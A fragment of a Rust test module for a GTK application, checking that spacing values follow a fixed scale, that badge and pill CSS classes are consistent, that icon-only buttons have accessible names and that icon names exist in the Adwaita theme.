    // ---- VisualSystem / Accessibility / IconsExist, over this section -----

    const SCALE: &[u32] = &[2, 4, 6, 8, 12, 16, 20, 24];
    const PILLS: &[&str] = &["pill", "pill-crit", "pill-warn", "pill-ok", "pill-accent", "pill-quiet"];

    #[test]
    fn spacing_comes_from_the_scale() {
        let kw = Regex::new(r"\.(margin_(?:start|end|top|bottom)|spacing)\((\d+)\)").unwrap();
        let boxed = Regex::new(r"gtk::Box::new\(gtk::Orientation::\w+, (\d+)\)").unwrap();
        let mut offenders = Vec::new();
        for c in kw.captures_iter(source()) {
            let v: u32 = c[2].parse().unwrap();
            if !SCALE.contains(&v) {
                offenders.push(format!("{}={v}", &c[1]));
            }
        }
        for c in boxed.captures_iter(source()) {
            let v: u32 = c[1].parse().unwrap();
            // Box() with no spacing is spelled 0 in Rust.
            if v != 0 && !SCALE.contains(&v) {
                offenders.push(format!("spacing={v}"));
            }
        }
        assert!(offenders.is_empty(), "spacing off the scale {SCALE:?}: {offenders:?}");
    }

    #[test]
    fn badges_use_one_pill_system() {
        let retired = [
            "crit-pill", "stale-pill", "crit-core", "store-chip", "store-installed",
            "trust-official", "trust-ok", "trust-warn", "trust-none",
        ];
        let found: Vec<_> = retired.iter().filter(|n| source().contains(&format!("\"{n}\""))).collect();
        assert!(found.is_empty(), "retired badge classes still referenced: {found:?}");
    }

    #[test]
    fn every_pill_class_is_defined_in_the_stylesheet() {
        let re = Regex::new(r#""(pill(?:-[a-z]+)?)""#).unwrap();
        let used: BTreeSet<String> = re.captures_iter(source()).map(|c| c[1].to_string()).collect();
        assert!(!used.is_empty(), "no pill classes found at all");
        for name in &used {
            assert!(CSS.contains(&format!(".{name}")), "{name} is applied but never styled");
            assert!(PILLS.contains(&name.as_str()), "unknown pill variant: {name}");
        }
    }

    #[test]
    fn every_icon_only_button_is_named() {
        let lines: Vec<&str> = source().lines().collect();
        let made = Regex::new(r"let (\w+) = gtk::(?:Menu|Toggle)?Button::(?:from_icon_name|builder\(\)\s*\.icon_name)").unwrap();
        let mut unnamed = Vec::new();
        for (i, line) in lines.iter().enumerate() {
            let Some(m) = made.captures(line) else { continue };
            let var = &m[1];
            let window = lines[i..(i + 12).min(lines.len())].join("\n");
            if !window.contains(&format!("name(&{var}")) && !window.contains("Property::Label") {
                unnamed.push(format!("store_actions.rs:{} {var}", i + 1));
            }
        }
        assert!(unnamed.is_empty(), "{unnamed:?}");
    }

    #[test]
    fn every_icon_name_is_in_adwaita_or_shipped_here() {
        let adwaita = Path::new("/usr/share/icons/Adwaita");
        if !adwaita.is_dir() {
            eprintln!("Adwaita icon theme not installed; skipped");
            return;
        }
        fn walk(dir: &Path, out: &mut BTreeSet<String>) {
            let Ok(entries) = std::fs::read_dir(dir) else { return };
            for e in entries.flatten() {
                let path = e.path();
                if path.is_dir() {
                    walk(&path, out);
                } else if matches!(path.extension().and_then(|x| x.to_str()), Some("svg" | "png")) {
                    if let Some(stem) = path.file_stem().and_then(|s| s.to_str()) {
                        out.insert(stem.to_string());
                    }
                }
            }
        }
        let mut have = BTreeSet::new();
        walk(adwaita, &mut have);
        walk(&Path::new(env!("CARGO_MANIFEST_DIR")).join("icons"), &mut have);
        let re = Regex::new(r#""([a-z0-9-]+-symbolic)""#).unwrap();
        let missing: Vec<String> = re
            .captures_iter(source())
            .map(|c| c[1].to_string())
            .filter(|n| !have.contains(n) && !n.starts_with("adw-"))
            .collect();
        assert!(missing.is_empty(), "{missing:?}");
    }
}
